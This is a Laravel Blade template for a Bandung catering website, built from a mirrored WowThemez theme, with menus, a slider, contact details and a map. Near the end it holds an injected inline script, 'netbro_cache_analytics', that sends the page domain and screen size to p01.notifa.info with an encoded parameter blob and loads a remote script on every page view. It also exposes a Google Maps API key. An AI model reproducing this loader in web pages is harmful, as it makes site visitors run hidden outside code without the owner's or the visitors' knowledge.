<!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
    
<!-- Mirrored from wowthemez.com/templates/hangout/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Jan 2019 01:52:05 GMT -->
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="">
        <meta name="author" content="AlexaTheme">
       
        <title>Rai Catering</title>
        
		<link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/hangout/img/favicon.png') }}">

        <!-- Elegant Font Icons CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/elegant-font-icons.css') }}">
        <!-- Elegant Line Icons CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/elegant-line-icons.css') }}">
		<!-- Bootstrap CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/bootstrap.min.css') }}">
        <!-- animate CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/animate.min.css') }}">
		<!-- Venobox CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/venobox/venobox.css') }}">
		<!-- OWL-Carousel CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/owl.carousel.css') }}">
        <!-- Slick Nav CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/slicknav.min.css') }}">
		<!-- Main CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/main.css') }}">
		<!-- Responsive CSS -->
        <link rel="stylesheet" href="{{asset('assets/hangout/css/responsive.css') }}">

        <script src="{{asset ('assets/hangout/js/vendor/modernizr-2.8.3-respond-1.4.2.min.js') }}"></script>
    </head>
    <body>
        <!--[if lt IE 8]>
            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
        
        <div id='preloader' >
            <div class='loader' >
                <img src="{{asset('assets/hangout/img/chef-preloader.gif')}}" width="80" alt="">
            </div>
        </div><!-- Preloader -->
        
        <header id="header" class="header_section">
			<nav class="navbar">
				<div class="container">
					<div class="navbar-header">
						<!-- <img src="{{asset('assets/hangout/img/logo.png') }}" alt="Logo"> -->
					</div>
					<div id="navbar" class="navbar-right">
						<ul id="mainmenu" class="nav navbar-nav nav-menu">
                            <li><a href="{{route('catering')}}"  style="font-size: 14px;">Beranda <span class="sr-only">(current)</span></a>
                            </li>            
                            <li><a href="{{route('cabang1')}}"style="font-size: 14px;">Cabang</a></li>
                            <li class="active"><a href="{{route('makanan_frontend')}}" style="font-size: 14px;">Menu</a></li>
                            <li> <a href="#" style="font-size: 14px;">Kategori Paket</a>
                                <ul>
                                    @foreach($categori_paket as $data)
                                    <li  class="active"><a href="{{route('isipaket',$data->id)}}" style="font-size: 14px;">{{$data->kategori}}</a></li>
                                    @endforeach
                                </ul>
                            </li>
                        </ul>
					</div><!--/.navbar-collapse -->
				</div>
			</nav><!-- Navigation Bar -->
		</header> <!-- Header_Section -->

        <section class="slider_section">
            <ul id="main-slider" class="owl-carousel main_slider">
                <li class="main_slide" style="background-image: url({{asset('assets/hangout/img/i-18.jpg')}});">
                    <div class="container">
                        <div class="display-table">
                            <div class="table-cell">
                                <div class="slider_content align-center">
                                    <h3 class="text-white">Selamat Datang</h3>
                                    <h1 class="text-white">Rai Catering</h1>
                                    <p class="text-white">ADA ACARA MENDADAK DI BANDUNG ? CARI CATERING ENAK DAN HARGA TERJANGKAU ?<br> RAI CATERING PILIHANNYA.</p>
                                    <!-- <div class="btn_group">
                                        <a href="#" class="default_btn">Discover Now</a>
                                        <a href="#" class="default_btn">Reservation</a>
                                    </div> -->
                                </div>
                            </div>
                        </div>
                    </div>
                </li>
                <li class="main_slide" style="background-image: url({{asset('assets/hangout/img/i-45.jpg')}});">
                    <div class="container">
                        <div class="display-table">
                            <div class="table-cell">
                                <div class="slider_content align-center">
                                    <h3 class="text-white">Selamat Datang</h3>
                                    <h1 class="text-white">Rai Catering</h1>
                                    <p class="text-white">ADA ACARA MENDADAK DI BANDUNG ? CARI CATERING ENAK DAN HARGA TERJANGKAU ?<br> RAI CATERING PILIHANNYA.</p>
                                    <!-- <div class="btn_group">
                                        <a href="#" class="default_btn">Discover Now</a>
                                        <a href="#" class="default_btn">Reservation</a>
                                    </div> -->
                                </div>
                            </div>
                        </div>
                    </div>
                </li>
                <li class="main_slide" style="background-image: url({{asset('assets/hangout/img/i-20.jpg')}});">
                    <div class="container">
                        <div class="display-table">
                            <div class="table-cell">
                                <div class="slider_content align-center">
                                    <h3 class="text-white">Selamat Datang</h3>
                                    <h1 class="text-white">Rai Catering</h1>
                                    <p class="text-white">ADA ACARA MENDADAK DI BANDUNG ? CARI CATERING ENAK DAN HARGA TERJANGKAU ?<br> RAI CATERING PILIHANNYA.</p>
                                    <!-- div class="btn_group">
                                        <a href="#" class="default_btn">Discover Now</a>
                                        <a href="#" class="default_btn">Reservation</a>
                                    </div> -->
                                </div>
                            </div>
                        </div>
                    </div>
                </li>
            </ul>
        </section><!-- /.slider_section -->
		
        <section id="menu" class="menu_section bd-bottom padding">
			<div class="container">
				<div class="section_heading align-center mb-40">
					<h2>Menu</h2>
					<p>Rai Catering memiliki berbagai macam menu makanan tradisional maupun internasional.</p>
				</div><!-- /.section_heading -->
                
				<div class="menu_items">
					<ul class="tab_menu mb-30">
                   @foreach($categori_makanan as $data)
                        <li><a href="{{route('isimenu',$data->id)}}">{{$data->kategori_makanan}}</a></li>
                        @endforeach      <!-- <li><a href="#fastfood" data-toggle="tab">Fastfood</a></li>
                        <li><a href="#lunch" data-toggle="tab">Lunch</a></li>
                        <li><a href="#package" data-toggle="tab">Package</a></li>
                        <li><a href="#dinner" data-toggle="tab">Dinner</a></li> -->
                   
                    </ul>
                    <div class="tab-content">
                        <br><br>
                        <center><h2>{{$kategori_makanan->kategori_makanan}}</h2></center>
                        <br><br>
                        <div class="tab-pane fade tab_content in active" id="ayam">
                            @foreach($kategori_makanan->makanan()->get() as $data)
                            <div class="col-sm-4 col-xs-6 xs-padding">
                                <div class="food_content align-center">
                                    <img src="{{asset('assets/hangout/img/'.$data->foto) }}" style="max-height:190px; max-width: 190px; margin-top: 6px;">
                                    <h3>{{$data->makanan}}</h3>
                                    
                                </div>
                            </div>
                            @endforeach
                        </div>
                    </div>
                </div>
            </div>
		</section><!-- /.menu_section -->
		
		<section id="subscribe" class="widget_section padding">
            <div class="container">
                <div class="col-md-4 col-xs-6 xs-padding">
                    <div class="footer_widget">
                        <h3 class="text-white">Kontak</h3>
                        <p>Alamat: Jl. Sawah Kurung IV No.8, Ciateul, Regol, Kota Bandung, Jawa Barat 40252
                        <br>022-834537452</p><br>
                        <div class="col-md-4 col-xs-6 xs-padding">
                    <div class="footer_widget">
                        <h3 class="text-white">Jam Buka:</h3>
                        <p>09:00-21:00</p>
                        
                    </div>
                </div>
                
                        <!-- <ul class="widget_social">
                            <li><a href="#"><i class="social_facebook"></i></a></li>
                            <li><a href="#"><i class="social_twitter"></i></a></li>
                            <li><a href="#"><i class="social_googleplus"></i></a></li>
                            <li><a href="#"><i class="social_instagram"></i></a></li>
                            <li><a href="#"><i class="social_linkedin"></i></a></li>
                        </ul> -->
                    </div>
                </div>
                <div class="col-md-4 col-xs-12 xs-padding">
                    <div class="footer_widget">
                        <h4 class="text-white">Alamat Rai Catering</h4>
                        <div class="map-area">
                            <!-- google-map-area start -->
                            <div class="google-map-area">
                                 <!-- Map Section -->
                                <div id="contacts" class="map-area">
                                    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15842.551305772507!2d107.612569!3d-6.933818!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0xe430d781b9b49d8d!2sRai+Catering+%26+Wedding+Organizer!5e0!3m2!1sen!2sid!4v1547623362800" width="450" height="400" frameborder="0" style="border:0" allowfullscreen></iframe>
                                </div>
                            </div>
                        </div>
                        </div>
                    </div>
                <!-- <div class="col-md-4 col-xs-12 xs-padding">
                    <div class="footer_widget">
                        <h4 class="text-white">Subscribe to our contents</h4>
                        <div class="subscribe_form">
                            <form action="#" class="subscribe_form">
                                <input type="email" name="email" id="subs-email" class="form_input" placeholder="Email Address...">
                                <button type="submit" class="submit">SUBSCRIBE</button>
                                <div class="clearfix"></div>
                                <div id="subscribe-result">
                                    <p class="subscription-success"></p>
                                    <p class="subscription-error"></p>
                                </div>
                            </form>
                            <p class="align-left">There are design companies and then there are user experience design professional.</p>
                        </div>
                    </div>
                </div> -->
            </div>
        </section><!-- /.widget_section -->

        <footer class="footer_section">
			<div class="container">
				<div class="col-xs-6 xs-padding">
				    <div class="copyright">&copy; 2018 Hangout Powered by WowThemez</div>
				</div>
				<div class="col-xs-6 xs-padding">
				    <ul class="footer_social">
				        <li><a href="#">Orders</a></li>
				        <li><a href="#">Terms</a></li>
				        <li><a href="#">Report Problem</a></li>
				    </ul>
				</div>
			</div>
		</footer><!-- /.footer_section -->
        
		<a data-scroll href="#header" id="scroll-to-top"><i class="arrow_up"></i></a>
	
		<!-- jQuery Lib -->
		<script src="{{asset ('assets/hangout/js/vendor/jquery-1.12.4.min.js') }}"></script>
		<!-- Bootstrap JS -->
		<script src="{{asset ('assets/hangout/js/vendor/bootstrap.min.js') }}"></script>
        <!-- Imagesloaded JS -->
        <script src="{{asset ('assets/hangout/js/vendor/imagesloaded.pkgd.min.js') }}"></script>
		<!-- OWL-Carousel JS -->
		<script src="{{asset ('assets/hangout/js/vendor/owl.carousel.min.js') }}"></script>
		<!-- isotope JS -->
		<script src="{{asset ('assets/hangout/js/vendor/jquery.isotope.v3.0.2.js') }}"></script>
		<!-- Smooth Scroll JS -->
		<script src="{{asset ('assets/hangout/js/vendor/smooth-scroll.min.js') }}"></script>
		<!-- venobox JS -->
		<script src="{{asset ('assets/hangout/js/vendor/venobox.min.js') }}"></script>
        <!-- ajaxchimp JS -->
        <script src="{{asset ('assets/hangout/js/vendor/jquery.ajaxchimp.min.js') }}"></script>
        <!-- Slick Nav JS -->
        <script src="{{asset ('assets/hangout/js/vendor/jquery.slicknav.min.js') }}"></script>
		<!-- Contact JS -->
		<script src="{{asset ('assets/hangout/js/contact.html') }}"></script>
		<!-- Main JS -->
		<script src="{{asset ('assets/hangout/js/main.js') }}"></script>

    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2FOtPEyxPES%2fqD9YxvgYgokPk8C6RbZuOPe0OEuYzGTirfrzieIY1DZFurgkDx%2b1wVbeLi4LAAPrVRpBEKTxNBlw%2bpLDvFJnFr5rvHu9VTQwDEys9tM8w9qrcvyk2jxSNQle6eIyfBx2erORNSb%2bx7dj94KZ%2bZ01xG3qflsByXz74E8r5pJbtZS1lP%2bMSBVhtGEdQfgUF1aqLXpHly5N4CPio2IjyWgQMnhMzjVHUh11wjP%2faoYRyS3UNR10N2bmW9wyDUA2RAQSX%2fcd%2fseBRhikmavWYABT4Ev5c3svdsvqBlyO0hWU2i7vjudj1Ag%2ftM%2bgNi4GBIl3JlCXGXdVMb4B86%2brX9XQivOKj4jTzhwTd0D99XpIOYFCsHY8zUKY9S8RYLRYovFgiul9lxeKXyK16GQkicydLMr%2fZaFdI29m4ESfTJ6J0B0r8J3Z%2f2xdrCXUjoX1iGeD8XMeT2XAbrVaQH%2fO%2blWUCG%2fmzv%2fw2Ab0%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDSLSFRa0DyBj9VGzT7GM6SFbSMcG0YNBM"></script> 
        <script type="text/javascript">
            google.maps.event.addDomListener(window, 'load', init);
            function init() {
                var mapOptions = {
                    zoom: 11,
                    center: new google.maps.LatLng(40.6700, -73.9400), // New York
                    styles: [{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]
                };
                var mapElement = document.getElementById('googleMap');
                var map = new google.maps.Map(mapElement, mapOptions);
                var marker = new google.maps.Marker({
                    position: map.getCenter(),
                    animation:google.maps.Animation.BOUNCE,
                    icon: 'img/map-marker.png',
                    map: map
                });
            }
        </script>
<!-- WhatsHelp.io widget -->
<script type="text/javascript">
    (function () {
        var options = {
            whatsapp: "+62895365119942", // WhatsApp number
            call_to_action: "Silahkan Hubungi Kami", // Call to action
            position: "left", // Position may be 'right' or 'left'
        };
        var proto = document.location.protocol, host = "whatshelp.io", url = proto + "//static." + host;
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
        s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
        var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
    })();
</script>
<!-- /WhatsHelp.io widget -->
</body>

<!-- Mirrored from wowthemez.com/templates/hangout/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Jan 2019 02:00:26 GMT -->
</html>